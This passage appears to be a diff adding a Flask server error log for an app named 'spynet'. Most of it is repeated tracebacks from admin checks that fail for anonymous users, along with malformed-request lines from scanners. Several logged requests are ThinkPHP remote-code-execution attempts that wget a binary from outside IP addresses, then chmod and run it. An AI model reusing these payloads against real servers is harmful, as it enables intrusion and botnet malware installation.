+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+93.174.93.12 - - [02/Sep/2024 18:52:10] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+5.8.11.202 - - [02/Sep/2024 19:06:55] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+206.168.34.203 - - [02/Sep/2024 19:21:46] code 505, message Invalid HTTP version (2.0)
+122.51.64.230 - - [02/Sep/2024 19:49:34] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+134.209.189.103 - - [02/Sep/2024 20:56:57] code 400, message Bad request syntax ('\x16\x03\x01\x01ü\x01\x00\x01ø\x03\x03þþ$¥\x06æö«Æ\x00\x82÷9ö·\x8fá\x8bà+(ã\x01Gî\x12\x00\x96Ko\x83\x9c\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+200.81.185.179 - - [02/Sep/2024 21:12:57] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://157.230.218.54/bins/nine.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+117.72.13.164 - - [02/Sep/2024 22:07:46] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+78.153.140.151 - - [02/Sep/2024 22:30:49] code 400, message Bad request syntax ('\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03(®%<Ø]\x9f\x87\x82×»^\x8föq÷´ÅÐD\x1b§\x9e\x05\x10DvÏ\x81Àk\x9d\x00\x008À,À')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+66.175.213.4 - - [02/Sep/2024 23:49:22] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/website/views.py", line 557, in check_username
+    if current_user.type != 'admin':
+      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+             ^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/website/views.py", line 557, in check_username
+    if current_user.type != 'admin':
+      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+64.62.197.122 - - [03/Sep/2024 01:33:05] code 400, message Bad request version ('À\x14À')
+117.72.67.243 - - [03/Sep/2024 02:26:00] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+179.43.168.130 - - [03/Sep/2024 04:54:49] code 400, message Bad request version ('À\x13À')
+185.100.87.136 - - [03/Sep/2024 04:59:25] code 400, message Bad HTTP/0.9 request type ('\x10')
+185.100.87.136 - - [03/Sep/2024 04:59:35] code 400, message Bad request version ('Ý%d1\x17¦%nÅ')
+198.235.24.141 - - [03/Sep/2024 06:00:11] code 400, message Bad request version ('À\x13À')
+198.235.24.141 - - [03/Sep/2024 06:00:11] code 400, message Bad request version ('À(À$À\x14À')
+117.72.15.227 - - [03/Sep/2024 06:39:04] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+117.72.67.243 - - [03/Sep/2024 06:51:52] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+117.72.67.243 - - [03/Sep/2024 06:51:53] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+159.65.23.118 - - [03/Sep/2024 07:11:01] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01ü\x01\x00\x01ø\x03\x03ìõ¾)¤\x90\x862¾î®4¡\x08V(òÚ')
+80.82.77.202 - - [03/Sep/2024 08:06:10] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+159.89.7.117 - - [03/Sep/2024 09:40:41] code 400, message Bad request version ('M}+.þØª\x94\x86\xad7<Ûàý\x14î\x96\x13î°º\x91½âK')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+159.65.121.249 - - [03/Sep/2024 09:40:41] code 400, message Bad request version ("\x12&\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+159.89.7.117 - - [03/Sep/2024 09:40:41] code 400, message Bad request version ('À\x13À')
+159.89.7.117 - - [03/Sep/2024 09:40:41] code 400, message Bad request version ('À\x13À')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
